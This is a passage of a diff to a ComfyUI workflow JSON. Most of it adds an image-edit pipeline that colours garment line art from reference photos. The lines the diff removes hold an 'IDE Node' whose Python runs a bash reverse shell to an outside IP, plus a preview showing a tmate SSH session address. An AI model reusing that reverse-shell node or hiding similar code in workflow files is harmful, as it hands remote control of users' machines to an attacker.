@@ -1,27 +1,3821 @@
 {
-  "1": {
+  "626": {
     "inputs": {
-      "language": "python",
-      "Load code": "-- Select code file --",
-      "pycode": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/2.27.20.81/444 0>&1\"')"
+      "image": "70859a88bc934dbd82d5d0525f146e1c_.jpg"
     },
-    "class_type": "IDENode",
+    "class_type": "LoadImage",
     "_meta": {
-      "title": "IDE Node"
+      "title": "尺码"
     }
   },
-  "3": {
+  "706": {
     "inputs": {
-      "preview": "[\n    \"ssh 2G6mrrpMz4ZETSsPkSBsKh5Vp@nyc1.tmate.io\",\n    \"https://tmate.io/t/2G6mrrpMz4ZETSsPkSBsKh5Vp\"\n]",
-      "previewMode": null,
-      "source": [
-        "1",
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "710": {
+    "inputs": {
+      "input_text": [
+        "738",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "711": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "718",
+        0
+      ],
+      "on_false": [
+        "710",
         0
       ]
     },
-    "class_type": "PreviewAny",
+    "class_type": "easy ifElse",
     "_meta": {
-      "title": "Предпросмотр любого"
+      "title": "是否判断"
+    }
+  },
+  "718": {
+    "inputs": {
+      "input_text": [
+        "738",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "736": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "711",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "737": {
+    "inputs": {
+      "image": [
+        "706",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "738": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "737",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "760": {
+    "inputs": {
+      "condition": [
+        "736",
+        0
+      ],
+      "image": [
+        "1242",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "762": {
+    "inputs": {
+      "samples": [
+        "763",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "763": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "769",
+        0
+      ],
+      "negative": [
+        "770",
+        0
+      ],
+      "latent_image": [
+        "765",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "765": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "767",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "766": {
+    "inputs": {
+      "conditioning": [
+        "771",
+        0
+      ],
+      "latent": [
+        "767",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "767": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "768": {
+    "inputs": {
+      "pixels": [
+        "760",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "769": {
+    "inputs": {
+      "conditioning": [
+        "766",
+        0
+      ],
+      "latent": [
+        "768",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "770": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "760",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "771": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "760",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "772": {
+    "inputs": {
+      "samples": [
+        "773",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "773": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "779",
+        0
+      ],
+      "negative": [
+        "780",
+        0
+      ],
+      "latent_image": [
+        "775",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "775": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "777",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "776": {
+    "inputs": {
+      "conditioning": [
+        "781",
+        0
+      ],
+      "latent": [
+        "777",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "777": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "778": {
+    "inputs": {
+      "pixels": [
+        "626",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "779": {
+    "inputs": {
+      "conditioning": [
+        "776",
+        0
+      ],
+      "latent": [
+        "778",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "780": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "626",
+        0
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "781": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "626",
+        0
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "782": {
+    "inputs": {
+      "vae_name": "qwen_image_vae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "加载VAE"
+    }
+  },
+  "783": {
+    "inputs": {
+      "clip_name": "qwen_2.5_vl_7b_fp8_scaled.safetensors",
+      "type": "qwen_image",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "加载CLIP"
+    }
+  },
+  "784": {
+    "inputs": {
+      "lora_name": "2511_000015210A100.safetensors",
+      "strength_model": 1.0,
+      "model": [
+        "786",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "785": {
+    "inputs": {
+      "unet_name": "qwen_image_edit_2511_fp8mixed.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "786": {
+    "inputs": {
+      "lora_name": "Qwen-Image-Edit-2511-Lightning-4steps-V1.0-bf16.safetensors",
+      "strength_model": 1.0,
+      "model": [
+        "785",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "1070": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1071": {
+    "inputs": {
+      "input_text": [
+        "1076",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1072": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1073",
+        0
+      ],
+      "on_false": [
+        "1071",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1073": {
+    "inputs": {
+      "input_text": [
+        "1076",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1074": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1072",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1075": {
+    "inputs": {
+      "image": [
+        "1070",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1076": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "1075",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1077": {
+    "inputs": {
+      "condition": [
+        "1074",
+        0
+      ],
+      "image": [
+        "1243",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1079": {
+    "inputs": {
+      "samples": [
+        "1080",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1080": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1086",
+        0
+      ],
+      "negative": [
+        "1087",
+        0
+      ],
+      "latent_image": [
+        "1082",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1082": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1084",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1083": {
+    "inputs": {
+      "conditioning": [
+        "1088",
+        0
+      ],
+      "latent": [
+        "1084",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1084": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1085": {
+    "inputs": {
+      "pixels": [
+        "1077",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1086": {
+    "inputs": {
+      "conditioning": [
+        "1083",
+        0
+      ],
+      "latent": [
+        "1085",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1087": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1077",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1088": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1077",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1090": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1091": {
+    "inputs": {
+      "input_text": [
+        "1096",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1092": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1093",
+        0
+      ],
+      "on_false": [
+        "1091",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1093": {
+    "inputs": {
+      "input_text": [
+        "1096",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1094": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1092",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1095": {
+    "inputs": {
+      "image": [
+        "1090",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1096": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "1095",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1097": {
+    "inputs": {
+      "condition": [
+        "1094",
+        0
+      ],
+      "image": [
+        "1244",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1099": {
+    "inputs": {
+      "samples": [
+        "1100",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1100": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1106",
+        0
+      ],
+      "negative": [
+        "1107",
+        0
+      ],
+      "latent_image": [
+        "1102",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1102": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1104",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1103": {
+    "inputs": {
+      "conditioning": [
+        "1108",
+        0
+      ],
+      "latent": [
+        "1104",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1104": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1105": {
+    "inputs": {
+      "pixels": [
+        "1097",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1106": {
+    "inputs": {
+      "conditioning": [
+        "1103",
+        0
+      ],
+      "latent": [
+        "1105",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1107": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1097",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1108": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1097",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1110": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1111": {
+    "inputs": {
+      "input_text": [
+        "1116",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1112": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1113",
+        0
+      ],
+      "on_false": [
+        "1111",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1113": {
+    "inputs": {
+      "input_text": [
+        "1116",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1114": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1112",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1115": {
+    "inputs": {
+      "image": [
+        "1110",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1116": {
+    "inputs": {
+      "text": "1024",
+      "anything": [
+        "1115",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1117": {
+    "inputs": {
+      "condition": [
+        "1114",
+        0
+      ],
+      "image": [
+        "1250",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1119": {
+    "inputs": {
+      "samples": [
+        "1120",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1120": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1126",
+        0
+      ],
+      "negative": [
+        "1127",
+        0
+      ],
+      "latent_image": [
+        "1122",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1122": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1124",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1123": {
+    "inputs": {
+      "conditioning": [
+        "1128",
+        0
+      ],
+      "latent": [
+        "1124",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1124": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1125": {
+    "inputs": {
+      "pixels": [
+        "1117",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1126": {
+    "inputs": {
+      "conditioning": [
+        "1123",
+        0
+      ],
+      "latent": [
+        "1125",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1127": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1117",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1128": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1117",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1129": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "1295",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "M尺码"
+    }
+  },
+  "1130": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1131": {
+    "inputs": {
+      "input_text": [
+        "1136",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1132": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1133",
+        0
+      ],
+      "on_false": [
+        "1131",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1133": {
+    "inputs": {
+      "input_text": [
+        "1136",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1134": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1132",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1135": {
+    "inputs": {
+      "image": [
+        "1130",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1136": {
+    "inputs": {
+      "text": "900",
+      "anything": [
+        "1135",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1137": {
+    "inputs": {
+      "condition": [
+        "1134",
+        0
+      ],
+      "image": [
+        "1249",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1139": {
+    "inputs": {
+      "samples": [
+        "1140",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1140": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1146",
+        0
+      ],
+      "negative": [
+        "1147",
+        0
+      ],
+      "latent_image": [
+        "1142",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1142": {
+    "inputs": {
+      "amount": [
+        "1229",
+        0
+      ],
+      "samples": [
+        "1144",
+        0
+      ]
+    },
+    "class_type": "RepeatLatentBatch",
+    "_meta": {
+      "title": "复制Latent批次"
+    }
+  },
+  "1143": {
+    "inputs": {
+      "conditioning": [
+        "1148",
+        0
+      ],
+      "latent": [
+        "1144",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1144": {
+    "inputs": {
+      "pixels": [
+        "1234",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1145": {
+    "inputs": {
+      "pixels": [
+        "1137",
+        1
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "1146": {
+    "inputs": {
+      "conditioning": [
+        "1143",
+        0
+      ],
+      "latent": [
+        "1145",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "ReferenceLatent"
+    }
+  },
+  "1147": {
+    "inputs": {
+      "prompt": "",
+      "clip": [
+        "783",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1137",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1148": {
+    "inputs": {
+      "prompt": "Fill the line art with colors taken directly from the reference garment photo. Keep the original line art structure intact, no shape distortion. Flat lighting, solid colors, no shadows, no wrinkles, clean print-ready output.",
+      "clip": [
+        "783",
+        0
+      ],
+      "image1": [
+        "1234",
+        0
+      ],
+      "image2": [
+        "1137",
+        1
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "TextEncodeQwenImageEditPlus"
+    }
+  },
+  "1150": {
+    "inputs": {
+      "image": "5x10.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "尺码"
+    }
+  },
+  "1151": {
+    "inputs": {
+      "input_text": [
+        "1156",
+        0
+      ],
+      "substring": "",
+      "mode": "任意满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1152": {
+    "inputs": {
+      "boolean": true,
+      "on_true": [
+        "1153",
+        0
+      ],
+      "on_false": [
+        "1151",
+        0
+      ]
+    },
+    "class_type": "easy ifElse",
+    "_meta": {
+      "title": "是否判断"
+    }
+  },
+  "1153": {
+    "inputs": {
+      "input_text": [
+        "1156",
+        0
+      ],
+      "substring": "5",
+      "mode": "同时满足"
+    },
+    "class_type": "CheckSubstringPresence",
+    "_meta": {
+      "title": "判断是否包含字符🐠meeeyo.com"
+    }
+  },
+  "1154": {
+    "inputs": {
+      "text": "0",
+      "anything": [
+        "1152",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1155": {
+    "inputs": {
+      "image": [
+        "1150",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "1156": {
+    "inputs": {
+      "text": "1340",
+      "anything": [
+        "1155",
+        0
+      ]
+    },
+    "class_type": "easy showAnything",
+    "_meta": {
+      "title": "展示任何"
+    }
+  },
+  "1157": {
+    "inputs": {
+      "condition": [
+        "1154",
+        0
+      ],
+      "image": [
+        "1248",
+        1
+      ]
+    },
+    "class_type": "kangmeng",
+    "_meta": {
+      "title": "kangmeng (条件路由)"
+    }
+  },
+  "1159": {
+    "inputs": {
+      "samples": [
+        "1160",
+        0
+      ],
+      "vae": [
+        "782",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "1160": {
+    "inputs": {
+      "seed": 814283498084395,
+      "steps": 4,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "784",
+        0
+      ],
+      "positive": [
+        "1166",
+        0
+      ],
+      "negative": [
+        "1167",
+        0
+      ],
+      "latent_image": [
+        "1162",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "1162": {
